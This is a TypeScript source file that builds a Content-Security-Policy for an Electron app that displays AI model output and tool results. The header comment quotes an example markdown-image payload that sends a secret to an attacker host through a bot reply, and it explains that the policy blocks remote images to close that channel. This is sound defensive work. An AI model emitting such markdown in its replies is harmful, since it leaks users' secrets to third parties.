// One Content-Security-Policy for every document this app ships.
//
// The renderer displays untrusted text all day: model output, tool results,
// webhook payloads. React escapes it and ChatMarkdown refuses raw HTML, but
// neither stops a *resource* the content asks for, and a resource request is a
// working exfiltration channel — `![](https://attacker/?d=<secret>)` in a bot
// reply is one GET the attacker reads off their access log. That is the hole
// this closes; the rest is ordinary Electron hardening.
//
// Applied by the harness to everything it serves, which is every document a
// packaged desktop window or a paired phone ever loads. `pnpm dev` deliberately
// gets none of this: Vite injects its own inline preamble and an HMR socket, so
// a policy strict enough to be worth shipping only breaks the dev loop.
const POLICY: Record<string, string[]> = {
  "default-src": ["'self'"],
  // blob: is not decoration — src/lib/stt/capture.ts builds the AudioWorklet
  // for Windows dictation out of a Blob, and AudioWorklet module loading is
  // governed by script-src. Drop it and the mic goes quiet with no error.
  "script-src": ["'self'", "blob:"],
  // Shiki writes per-token color into style attributes, so unsafe-inline is
  // load-bearing for every highlighted code block.
  "style-src": ["'self'", "'unsafe-inline'"],
  // No remote hosts on purpose. Screenshots reach the UI as data: URLs or from
  // /frames/ on this origin, so nothing legitimate needs the open internet —
  // and leaving https: here would keep the exfiltration channel open.
  "img-src": ["'self'", "data:", "blob:"],
  // spoken replies play from an object URL over the ElevenLabs bytes the
  // harness fetched — the renderer never talks to the voice provider itself
  "media-src": ["'self'", "blob:"],
  "font-src": ["'self'", "data:"],
  "worker-src": ["'self'", "blob:"],
  // Only the ingest host. us-assets is deliberately absent: analytics.ts turns
  // off posthog-js's external dependency loading, so nothing should ever be
  // fetched from there — and if that ever regresses, this is where it fails
  // loudly instead of silently pulling third-party script into the renderer.
  "connect-src": ["'self'", "https://us.i.posthog.com"],
  "object-src": ["'none'"],
  "base-uri": ["'none'"],
  "form-action": ["'none'"],
  "frame-ancestors": ["'none'"],
};

export const CONTENT_SECURITY_POLICY = Object.entries(POLICY)
  .map(([directive, values]) => `${directive} ${values.join(" ")}`)
  .join("; ");
